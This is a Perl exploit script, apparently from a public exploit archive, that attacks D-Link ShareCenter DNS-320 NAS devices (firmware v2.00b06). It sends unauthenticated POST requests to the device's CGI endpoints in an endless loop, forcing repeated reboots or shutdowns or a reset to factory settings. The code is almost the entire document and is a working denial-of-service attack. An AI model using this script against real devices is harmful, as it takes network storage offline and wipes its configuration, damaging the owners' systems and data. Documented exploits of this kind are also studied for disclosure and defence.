#!/usr/bin/perl
#
#  Title:  ShareCenter D-Link DNS-320 remote reboot/shutdown/reset (DoS). 
#  Type:   Hardware
#  Remote: yes
#  Author: rigan - imrigan [sobachka] gmail.com
#  
#  Tested on:
#  Firmware    : DNS320-v2.00b06
#
#  Security flaws: 
#  dsk_mgr.cgi allows execute reboot via POST request with parameter cmd=FMT_restart.
#  system_mgr.cgi allows execute reboot via POST request with parameter cmd=cgi_restart or cmd=cgi_reboot.
#  system_mgr.cgi allows execte shutdown via POST request with parameter cmd=cgi_shutdown. 
#  wizard_mgr.cgi allows to reset the firmware to default settings via POST request with parameter cmd=cgi_wizard.

use LWP::UserAgent;

print "[*] ShareCenter D-Link DNS-320 Remote Dos Exploit\n";

if (@ARGV != 3){ &usage; }

while (@ARGV > 0){
   $ip = shift(@ARGV);
   $port = shift(@ARGV);
   $mode = shift(@ARGV);
}

@cgi = ("dsk_mgr.cgi", "system_mgr.cgi", "wizard_mgr.cgi", "system_mgr.cgi");
@cmd = ("cmd=FMT_restart", "cmd=cgi_restart", "cmd=cgi_wizard", "cmd=cgi_shutdown");

$url = "http://".$ip.":".$port."/cgi-bin/".$cgi[$mode];

print "[*] DoS.............................................  \n"; 
while(1){
   my $ua = new LWP::UserAgent;
   my $req = HTTP::Request->new(POST=>$url);
   $req->content_type('application/x-www-form-urlencoded');
   $req->content($cmd[$mode]);
   my $res = $ua->request($req);
}

sub usage(){
   print "Usage: perl dlink.pl [target ip] [port] [0,1,2,3]  \n";
   print "=================================================  \n";
   print "0 - dsk_mgr.cgi cmd=FMT_restart [Reboot]           \n";
   print "1 - system_mgr.cgi cmd=cgi_restart [Reboot]        \n";
   print "2 - wizard_mgr.cgi cmd=cgi_wizard [Reset]          \n";
   print "3 - system_mgr.cgi cmd=shutdown [Shutdown]         \n";
   exit;
}